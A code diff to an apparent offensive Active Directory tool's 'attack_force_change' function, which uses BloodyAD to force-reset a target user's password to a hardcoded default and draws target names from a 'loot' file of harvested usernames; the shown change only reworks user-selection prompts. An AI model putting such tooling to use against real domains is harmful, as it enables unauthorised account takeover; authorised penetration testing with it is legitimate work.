@@ -9,18 +9,25 @@ DEFAULT_NEW_PASSWORD = "BaldHead2025!"
 def attack_force_change(session, *parts, session_mgr=None):
     print(blue(f"[*] Attempting to change password using BloodyAD on {session.target_ip}..."))
     target_user = parts[0] if parts else None
-    # === Prompt for user if not provided ===
+
     if not target_user:
-        loot_path = "loot/valid_users.txt"
-        if os.path.exists(loot_path):
-            with open(loot_path, "r") as f:
-                users = [line.strip() for line in f if line.strip()]
-            if users:
-                target_user = select_from_list(users, "Select user to change password")
+        choice = input("[?] Load usernames from loot/valid_users.txt? (Y/n): ").strip().lower()
+        if choice in ["", "y", "yes"]:
+            loot_path = "loot/valid_users.txt"
+            if os.path.exists(loot_path):
+                with open(loot_path, "r") as f:
+                    users = [line.strip() for line in f if line.strip()]
+                if users:
+                    target_user = select_from_list(users, "Select user to change password")
+                else:
+                    print(yellow("[!] No users found in the file."))
+                    target_user = input("[?] Enter username manually: ").strip()
             else:
-                target_user = input("[?] Enter username: ").strip()
+                print(yellow("[-] loot/valid_users.txt not found."))
+                target_user = input("[?] Enter username manually: ").strip()
         else:
-            target_user = input("[?] Enter username: ").strip()
+            target_user = input("[?] Enter username manually: ").strip()
+
 
     is_kerberos = not session.hash and not session.password
     is_self_change = session.username.lower() == target_user.lower()
